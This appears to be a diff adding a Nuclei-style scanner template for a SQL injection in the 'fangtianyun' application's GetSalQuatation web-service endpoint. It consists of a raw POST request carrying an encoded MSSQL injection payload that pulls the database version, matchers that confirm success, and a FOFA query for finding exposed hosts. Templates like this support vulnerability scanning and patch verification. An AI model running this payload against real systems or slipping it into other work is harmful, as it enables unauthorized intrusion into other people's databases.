@@ -1,0 +1,31 @@
+id: fangtianyun-GetSalQuatation-SQL
+
+info:
+  tags: fangtianyun-GetSalQuatation-SQL
+  name: fangtianyun-GetSalQuatation-SQL
+  author: xc
+  severity: high
+  description: fangtianyun-GetSalQuatation-SQL
+  metadata:
+    fofa-qeury: body="AjaxMethods.asmx/GetCompanyItem"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /AjaxMethods.asmx/GetSalQuatation HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {ID:"(SELECT CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)+(CASE WHEN (8725=8725) THEN @@VERSION ELSE CHAR(48) END)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(106)+CHAR(113))"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Microsoft SQL'
+      - type: status
+        status: 
+          - 500
